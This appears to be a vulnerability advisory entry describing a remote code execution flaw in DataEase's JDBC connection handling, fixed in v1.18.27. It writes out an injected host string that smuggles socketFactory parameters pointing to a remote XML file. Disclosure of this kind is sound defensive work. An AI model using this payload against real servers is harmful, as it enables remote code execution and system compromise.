    "description": "DataEase is an open source business analytics tool. Authenticated users can remotely execute code through the backend JDBC connection. When constructing the jdbc connection string, the parameters are not filtered. Constructing the host as ip5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http//ip5432/1.xml&a= can trigger the ClassPathXmlApplicationContext construction method. The vulnerability has been fixed in v1.18.27. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
